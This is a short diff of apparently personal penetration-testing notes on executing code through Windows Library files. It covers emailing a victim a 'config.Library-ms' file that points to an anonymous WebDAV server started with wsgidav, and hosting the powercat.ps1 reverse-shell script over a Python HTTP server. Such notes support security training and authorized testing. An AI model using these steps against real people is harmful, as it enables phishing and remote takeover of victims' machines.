@@ -72,7 +72,7 @@
 
 ## Execution vis Windows Library Files
 - create a folder for this
-1. Send email to victim containing 'config.Library-ms' which direct to malicious wsgidev 
+1. Prepare Send email to victim containing 'config.Library-ms' which direct to malicious wsgidev 
     ``` 
     wsgidav --host=0.0.0.0 --port 80 --auth=anonymous --root /home/kali/webdav/
     ```
@@ -109,6 +109,7 @@
     cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
     python3 -m http.server 8000
     ```
+MUST USE non 80 port!!
 
 ## SMTP tool
 Send email with given information e.g. receiver/sender, smtp server usrname pw
